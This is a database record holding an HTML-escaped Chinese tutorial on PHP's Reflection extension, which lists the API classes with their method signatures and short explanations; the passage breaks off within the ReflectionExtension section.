(54, 1, '反射php的列子', '', '', '&lt;div&gt;1。用途：&lt;/div&gt;\r\n&lt;div&gt;该扩展分析php程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。&lt;/div&gt;\r\n&lt;div&gt;Reflection可以说是对php库函数：“Classes/Objects 类／对象函数”的一个扩展。&lt;/div&gt;\r\n&lt;div&gt;主要用在通过程序检测现有php程序内部关于类、方法等信息，并做出处理。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;2。API概览：&lt;/div&gt;\r\n&lt;div&gt;class Reflection { }&lt;/div&gt;\r\n&lt;div&gt;interface Reflector { }&lt;/div&gt;\r\n&lt;div&gt;class ReflectionException extends Exception { }&lt;/div&gt;\r\n&lt;div&gt;class ReflectionFunction implements Reflector { }&lt;/div&gt;\r\n&lt;div&gt;class ReflectionParameter implements Reflector { }&lt;/div&gt;\r\n&lt;div&gt;class ReflectionMethod extends ReflectionFunction { }&lt;/div&gt;\r\n&lt;div&gt;class ReflectionClass implements Reflector { }&lt;/div&gt;\r\n&lt;div&gt;class ReflectionObject extends ReflectionClass { }&lt;/div&gt;\r\n&lt;div&gt;class ReflectionProperty implements Reflector { }&lt;/div&gt;\r\n&lt;div&gt;class ReflectionExtension implements Reflector { }&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;3。详细说明：（例子详见php手册）&lt;/div&gt;\r\n&lt;div&gt;①Reflection类&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php&lt;/div&gt;\r\n&lt;div&gt;class Reflection&lt;/div&gt;\r\n&lt;div&gt;{&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public static mixed export(Reflector r [,bool return])&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//导出一个类或方法的详细信息&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public static array getModifierNames(int modifiers)&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得修饰符的名字&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;②ReflectionException类&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;该类继承标准类，没特殊方法和属性。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;③ReflectionFunction类&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php&lt;/div&gt;\r\n&lt;div&gt;class ReflectionFunction implements Reflector&lt;/div&gt;\r\n&lt;div&gt;{&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;final private __clone()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public object __construct(string name)&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public string __toString()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public static string export()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//导出该函数的详细信息&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public string getName()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得函数名&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isInternal()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试是否为系统内部函数&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isUserDefined()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试是否为用户自定义函数&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public string getFileName()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得文件名，包括路径名&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public int getStartLine()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得定义函数的起始行&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public int getEndLine()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得定义函数的结束行&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public string getDocComment()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得函数的注释&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public array getStaticVariables()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得静态变量&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public mixed invoke(mixed* args)&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//调用该函数，通过参数列表传参数&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public mixed invokeArgs(array args)&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//调用该函数，通过数组传参数&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool returnsReference()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该函数是否返回引用&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public ReflectionParameter[] getParameters()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得该方法所需的参数，返回值为对象数组&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public int getNumberOfParameters()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得该方法所需的参数个数&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public int getNumberOfRequiredParameters()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得该方法所需的参数个数&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;④ReflectionParameter类：&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php&lt;/div&gt;\r\n&lt;div&gt;class ReflectionParameter implements Reflector&lt;/div&gt;\r\n&lt;div&gt;{&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;final private __clone()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public object __construct(string name)&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public string __toString()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public static string export()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//导出该参数的详细信息&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public string getName()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得参数名&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isPassedByReference()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该参数是否通过引用传递参数&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public ReflectionClass getClass()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//若该参数为对象，返回该对象的类名&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isArray()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该参数是否为数组类型&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool allowsNull()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该参数是否允许为空&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isOptional()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该参数是否为可选的，当有默认参数时可选&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isDefaultValueAvailable()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该参数是否为默认参数&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public mixed getDefaultValue()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得该参数的默认值&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;⑤ReflectionClass类：&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php&lt;/div&gt;\r\n&lt;div&gt;class ReflectionClass implements Reflector&lt;/div&gt;\r\n&lt;div&gt;{&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;final private __clone()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public object __construct(string name)&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public string __toString()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public static string export()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//导出该类的详细信息&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public string getName()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得类名或接口名&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isInternal()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该类是否为系统内部类&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isUserDefined()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该类是否为用户自定义类&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isInstantiable()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该类是否被实例化过&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool hasConstant(string name)&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该类是否有特定的常量&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool hasMethod(string name)&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该类是否有特定的方法&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool hasProperty(string name)&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该类是否有特定的属性&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public string getFileName()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得定义该类的文件名，包括路径名&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public int getStartLine()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得定义该类的开始行&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public int getEndLine()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得定义该类的结束行&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public string getDocComment()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得该类的注释&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public ReflectionMethod getConstructor()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得该类的构造函数信息&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public ReflectionMethod getMethod(string name)&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得该类的某个特定的方法信息&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public ReflectionMethod[] getMethods()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得该类的所有的方法信息&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public ReflectionProperty getProperty(string name)&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得某个特定的属性信息&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public ReflectionProperty[] getProperties()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得该类的所有属性信息&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public array getConstants()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得该类所有常量信息&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public mixed getConstant(string name)&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得该类特定常量信息&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public ReflectionClass[] getInterfaces()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得接口类信息&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isInterface()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该类是否为接口&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isAbstract()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该类是否为抽象类&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isFinal()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该类是否声明为final&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public int getModifiers()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得该类的修饰符，返回值类型可能是个资源类型&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//通过Reflection::getModifierNames($class-&amp;gt;getModifiers())进一步读取&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isInstance(stdclass object)&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试传入的对象是否为该类的一个实例&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public stdclass newInstance(mixed* args)&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//创建该类实例&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public ReflectionClass getParentClass()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得父类&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isSubclassOf(ReflectionClass class)&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试传入的类是否为该类的父类&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public array getStaticProperties()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得该类的所有静态属性&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public mixed getStaticPropertyValue(string name [, mixed default])&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得该类的静态属性值，若private，则不可访问&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public void setStaticPropertyValue(string name, mixed value)&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//设置该类的静态属性值，若private，则不可访问，有悖封装原则&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public array getDefaultProperties()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得该类的属性信息，不含静态属性&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isIterateable()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool implementsInterface(string name)&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试是否实现了某个特定接口&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public ReflectionExtension getExtension()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public string getExtensionName()&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;⑥ReflectionMethod类：&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php&lt;/div&gt;\r\n&lt;div&gt;class ReflectionMethod extends ReflectionFunction&lt;/div&gt;\r\n&lt;div&gt;{&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public __construct(mixed class, string name)&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public string __toString()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public static string export()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//导出该方法的信息&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public mixed invoke(stdclass object, mixed* args)&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//调用该方法&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public mixed invokeArgs(stdclass object, array args)&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//调用该方法，传多参数&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isFinal()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该方法是否为final&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isAbstract()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该方法是否为abstract&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isPublic()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该方法是否为public&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isPrivate()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该方法是否为private&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isProtected()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该方法是否为protected&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isStatic()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该方法是否为static&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isConstructor()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该方法是否为构造函数&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isDestructor()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该方法是否为析构函数&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public int getModifiers()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得该方法的修饰符&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public ReflectionClass getDeclaringClass()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得该方法所属的类&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;// Inherited from ReflectionFunction&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;final private __clone()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public string getName()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isInternal()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isUserDefined()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public string getFileName()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public int getStartLine()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public int getEndLine()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public string getDocComment()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public array getStaticVariables()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool returnsReference()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public ReflectionParameter[] getParameters()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public int getNumberOfParameters()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public int getNumberOfRequiredParameters()&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;⑦ReflectionProperty类：&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php&lt;/div&gt;\r\n&lt;div&gt;class ReflectionProperty implements Reflector&lt;/div&gt;\r\n&lt;div&gt;{&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;final private __clone()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public __construct(mixed class, string name)&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public string __toString()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public static string export()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//导出该属性的详细信息&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public string getName()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得该属性名&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isPublic()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该属性名是否为public&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isPrivate()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该属性名是否为private&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isProtected()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该属性名是否为protected&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isStatic()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//测试该属性名是否为static&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public bool isDefault()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public int getModifiers()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得修饰符&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public mixed getValue(stdclass object)&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得该属性值&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public void setValue(stdclass object, mixed value)&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//设置该属性值&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public ReflectionClass getDeclaringClass()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得定义该属性的类&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public string getDocComment()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得该属性的注释&lt;/div&gt;\r\n&lt;div&gt;}&lt;/div&gt;\r\n&lt;div&gt;?&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;⑧ReflectionExtension类&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php&lt;/div&gt;\r\n&lt;div&gt;class ReflectionExtension implements Reflector {&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;final private __clone()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public __construct(string name)&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public string __toString()&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public static string export()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//导出该扩展的所有信息&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public string getName()&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;//取得该扩展的名字&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;public string 